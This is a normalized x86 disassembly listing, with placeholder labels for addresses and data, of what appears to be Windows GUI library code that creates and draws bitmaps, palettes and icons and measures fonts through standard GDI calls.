call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c88
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41584c
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41db90
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41dbb0
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41584c
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41da20
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4224af
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41de58
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_422417
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41584c
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41da20
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4223eb
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e110
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c824
call sub_41d900
jmp r-xdata
xor eax eax
push ebp
push sub_42247e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41584c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4223f2
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4224b6
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c824
call sub_41d900
jmp r-xdata
sub_4223f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_4224b6
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c88
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42254b
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e110
mov [ ebp - 0x30 ] eax
sub_422568
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_421f1c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4225ac
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_421cac
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41584c
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c88
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_421f1c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_422044
call sub_41d900
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42261c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_421cac
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c88
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_4212c4
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_4226b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_421f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4226e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_421b68
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_421cac
mov eax esi
call sub_421dbc
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_421cac
mov eax esi
call sub_421dbc
mov eax esi
call sub_421c38
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_4212c4
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4216c8
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_421f1c
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_421f1c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_420c60
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422818
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_421cbc
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4216c8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42286c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_421cbc
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4216c8
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4228ec
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_421cac
mov eax ebx
call sub_421cbc
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_420c60
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422983
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_420b58
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41b904
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_422988
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a20
call sub_403a74
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_420b58
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4229c0
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_421cbc
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4216c8
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_422a10
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_421cbc
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4216c8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422a6c
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c88
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_421c38
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41e864
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415884
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415884
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c88
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_421afc
mov dl [ r-xdata ]
call sub_41d6fc
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41da20
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_420c14
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415884
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415884
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415884
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415884
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415884
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415884
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41de90
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415884
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e1b4
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_422d2c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_421cbc
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_420c60
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_422da6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_4212c4
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422dcc
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_422e14
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41eba0
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_420a8c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_422e68
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_420a90
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413f58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_422e98
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_423170
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_420a8c
mov eax [ esi + 0x28 ]
call sub_420a90
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413f84
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_422ef8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41d6fc
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_422f50
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_422f8c
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_415640
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41584c
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41e460
jmp r-xdata
jmp r-xdata
call sub_41d90c
sub_423004
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423091
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_422f50
cmp eax [ rw-data ]
jne r-xdata
call sub_41d90c
mov eax esi
call sub_422f50
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41e9a4
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c88
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415884
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4230b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423146
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415620
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41584c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41584c
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_423170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41d90c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42314b
mov eax [ ebp - 0x4 ]
call sub_40326c
call sub_403a20
call sub_403a74
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423170
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4231b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_420a8c
mov eax [ ebx + 0x28 ]
call sub_420a90
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423230
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_423004
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415884
pop esi
pop ebx
retn
sub_423280
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41df60
mov [ rw-data ] eax
pop ebx
retn
sub_4232b8
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_4232fc
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4232b8
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
